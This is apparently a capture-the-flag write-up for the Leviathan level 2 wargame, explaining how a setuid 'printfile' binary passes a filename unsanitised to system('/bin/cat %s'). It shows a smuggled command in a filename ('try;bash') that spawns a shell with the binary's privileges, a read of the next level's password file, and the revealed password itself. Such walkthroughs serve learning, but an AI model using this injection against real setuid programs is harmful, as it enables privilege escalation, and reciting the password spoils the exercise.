# Leviathan2

## Level
Analyzing a setuid binary

## Logic
```ls -la```          
```file printfile```         
The directory has a setuid binary with leviathan3 as its owner called *printfile*.        
```./printfile```     
Simply trying to execute the program will give an alert regarding its usage. On reading the usage I thought that I'd just need to pass */etc/leviathan_pass/leviathan3* to get the password. However, that was not the case.            
```ltrace ./printfile```      
On closer inspection using `ltrace`, one can see that the program does an access check. Passing */etc/leviathan_pass/leviathan3* as an arguement gives **-1**(access check **failed**) and */etc/leviathan_pass/leviathan2* gives **0**(access check **passed**).      
```ltrace ./printfile /etc/leviathan_pass/leviathan3```     
```ltrace ./printfile /etc/leviathan_pass/leviathan2```     
Also notice that after the access check, it passes the filename as a string to *system(/bin/cat %s)* and this can be exploited.          
```mkdir /tmp/test/```         
```cd /tmp/test/```     
```touch "try;bash"```    
If the file acts as a bash command it will execute and with the permissions of the setuid binary i.e. as leviathan3             
```~/printfile "try;bash"```    
In this filename, ';' indicates the beginning of a separate command on the same line so in practice after the `cat` acts on the given file, the program will spawn a bash shell!     
(as leviathan3)     
```cat /etc/leviathan_pass/leviathan3```

## Password
Q0G8j4sakn